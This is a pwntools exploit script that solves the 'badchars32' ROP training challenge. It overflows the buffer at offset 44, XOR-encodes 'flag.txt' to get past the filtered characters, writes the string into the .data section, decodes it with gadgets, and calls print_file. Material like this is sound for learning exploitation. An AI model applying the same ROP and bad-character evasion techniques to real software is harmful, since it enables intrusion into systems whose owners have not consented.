# bai nay bi lam ngat phan gets() nen payload ko dc xuat hien cac ki tuj badchat
# _______________________________________________________________________________
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

mov_Pedi_esi = 0x0804854f
pop_esi_edi_ebp = 0x080485b9
data_section = 0x0804a018
print_file = 0x80483d0
# bad chars is 'g, x, a, .' so to pass badchar 'flag.txt' need to be XOR
val_to_xor_with = 2
xored_str = xor('flag.txt', val_to_xor_with)
info('flag.txt XORed with %d: %s', val_to_xor_with, xored_str)
# 'flag.txt' ^2 = 'dnce,vzv'
xor_ebp_bl = 0x08048547		# this can be XOR 1 char a time
pop_ebp_ret = 0x080485bb
pop_ebx_ret = 0x0804839d
# vi chi co the XOR 1 ky tu 1 lan nen sau khi dnce,vzv trong data_section
# thi ta can XOR lai ve flag.txt, do do can loop len('flag.txt') = 8 
xor_xpl = b""
data_addr_offset = 0
for ch in xored_str:
	xor_xpl += p32(pop_ebx_ret)
	xor_xpl += p32(val_to_xor_with)
	xor_xpl += p32(pop_ebp_ret)
	xor_xpl += p32(data_section	+ data_addr_offset)
	xor_xpl += p32(xor_ebp_bl)
	data_addr_offset += 1 		# next char in data section
payload = flat({
    44: [
    		pop_esi_edi_ebp,
    		xored_str[:4],
    		data_section,
    		0x0,
    		mov_Pedi_esi,

    		pop_esi_edi_ebp,
    		xored_str[4:],
    		data_section+0x4,
    		0x0,
    		mov_Pedi_esi,

    		# Now we need to decode 'flag.txt' (it's still XORd with '2')
    		xor_xpl,

    		print_file,
    		0x0,# ret addr
    		data_section
    ]
})

io = start()

write('payload', payload)

io.sendlineafter('>', payload)

io.recvline()
print(io.recvline())